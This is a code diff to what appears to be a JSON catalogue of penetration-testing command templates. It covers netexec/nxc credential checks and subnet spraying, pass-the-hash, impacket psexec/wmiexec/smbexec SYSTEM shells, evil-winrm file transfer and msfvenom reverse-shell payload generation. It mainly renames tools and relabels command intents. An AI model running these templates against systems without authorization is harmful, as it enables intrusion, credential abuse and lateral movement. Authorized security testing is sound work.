@@ -4,9 +4,7 @@
       "name": "searchsploit",
       "description": "Offline Exploit-DB search and copy tool.",
       "commands": [
-        {"purpose": "Search Exploit-DB for the product and version", "template": "searchsploit <product> <version>", "intent": "discover"},
-        {"purpose": "Copy an exploit into the working dir so you can read and edit it", "template": "searchsploit -m <edb-id>", "intent": "exploit"},
-        {"purpose": "Preview an exploit without copying it", "template": "searchsploit -x <edb-id>", "intent": "enumerate"}
+        {"purpose": "Search Exploit-DB for the product and version", "template": "searchsploit <product> <version>", "intent": "discover"}
       ]
     },
     {
@@ -28,13 +26,12 @@
       ]
     },
     {
-      "name": "netexec",
+      "name": "nxc",
       "description": "Network auth and command execution across SMB/WinRM/SSH/RDP/MSSQL (nxc).",
       "commands": [
         {"purpose": "Check a credential over SMB (watch for Pwn3d!)", "template": "nxc smb {{TARGET}} -u <user> -p <pass>", "intent": "authenticate"},
         {"purpose": "Run a command over WinRM", "template": "nxc winrm {{TARGET}} -u <user> -p <pass> -x whoami", "intent": "exploit"},
         {"purpose": "Check the same credential over other protocols", "template": "nxc ssh {{TARGET}} -u <user> -p <pass>", "intent": "authenticate"},
-        {"purpose": "Read the password policy before any spray", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --pass-pol", "intent": "enumerate"},
         {"purpose": "Spray one credential across a subnet without stopping at the first hit", "template": "nxc smb <subnet> -u <user> -p <pass> --continue-on-success", "intent": "authenticate"},
         {"purpose": "Authenticate with an NT hash instead of a password (pass-the-hash)", "template": "nxc smb {{TARGET}} -u <user> -H <hash>", "intent": "authenticate"}
       ]
@@ -59,8 +56,6 @@
       ]
     },
     { "name": "evil-winrm", "description": "Interactive Windows shell over WinRM.", "commands": [
-      { "purpose": "Shell in with a username and password", "template": "evil-winrm -i {{TARGET}} -u <user> -p <pass>", "intent": "authenticate" },
-      { "purpose": "Shell in with an NT hash (pass-the-hash)", "template": "evil-winrm -i {{TARGET}} -u <user> -H <hash>", "intent": "authenticate" },
       { "purpose": "In the session: upload a file from your Kali folder", "template": "upload <file>", "intent": "transfer" },
       { "purpose": "In the session: download a file to your Kali folder", "template": "download <file>", "intent": "transfer" }
     ] },
@@ -68,23 +63,23 @@
       "name": "impacket-psexec",
       "description": "SYSTEM shell via an SMB-installed service.",
       "commands": [
-        {"purpose": "SYSTEM shell with credentials", "template": "impacket-psexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"},
-        {"purpose": "SYSTEM shell with an NT hash", "template": "impacket-psexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "exploit"}
+        {"purpose": "SYSTEM shell with credentials", "template": "impacket-psexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate"},
+        {"purpose": "SYSTEM shell with an NT hash", "template": "impacket-psexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate"}
       ]
     },
     {
       "name": "impacket-wmiexec",
       "description": "Semi-interactive shell over WMI (quieter than psexec).",
       "commands": [
-        {"purpose": "Shell with credentials", "template": "impacket-wmiexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"},
-        {"purpose": "Shell with an NT hash", "template": "impacket-wmiexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "exploit"}
+        {"purpose": "Shell with credentials", "template": "impacket-wmiexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate"},
+        {"purpose": "Shell with an NT hash", "template": "impacket-wmiexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate"}
       ]
     },
     {
       "name": "impacket-smbexec",
       "description": "Command execution over SMB.",
       "commands": [
-        {"purpose": "Shell with credentials", "template": "impacket-smbexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "exploit"}
+        {"purpose": "Shell with credentials", "template": "impacket-smbexec <domain>/<user>:<pass>@{{TARGET}}", "intent": "authenticate"}
       ]
     },
     {
@@ -279,7 +274,7 @@
         {"purpose": "Pick the exact payload, format and matching listener on the app's Reverse shells page, then generate it", "template": "msfvenom -p <payload> LHOST={{LHOST}} LPORT={{LPORT}} -f <format> -o <file>", "intent": "exploit"}
       ]
     },
-    { "name": "Spray found credentials at the open services", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "You recovered a user and password and want every service on this box and the rest of the subnet it unlocks; check the lockout policy first.", "tools": ["netexec"], "commands": [
+    { "name": "Spray found credentials at the open services", "phase": "Initial Access", "service": "any", "applies": "any", "needs": ["creds"], "yields": ["shell"], "when": "You recovered a user and password and want every service on this box and the rest of the subnet it unlocks; check the lockout policy first.", "tools": ["nxc"], "commands": [
       { "purpose": "Test the credential over each exposed protocol (smb, ssh, winrm, rdp, mssql) and watch for Pwn3d!", "template": "nxc <proto> {{TARGET}} -u <user> -p <pass>", "intent": "authenticate" }
     ] },
     {
